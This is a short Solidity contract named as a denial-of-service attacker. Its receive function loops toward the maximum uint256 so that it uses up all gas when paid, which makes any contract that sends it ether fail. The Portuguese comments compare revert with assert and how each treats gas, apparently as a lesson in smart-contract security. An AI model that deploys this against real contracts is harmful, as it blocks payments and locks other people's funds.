//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackDenialMoreSimple {
    //uint public balance=1;
    uint256 sum=0;

    receive() external payable{
        uint MAX_UINT = 2**256-1;
        //emit EventName()
        // require("") // revert("erro") //retorna o GÁS
        //balance-=MAX_UINT;
        uint256 index;
        for (index = 0; index < MAX_UINT; index++) {
            sum += 1;
        }        
        //assert(false); //não retorna o GÁS
    }
    
}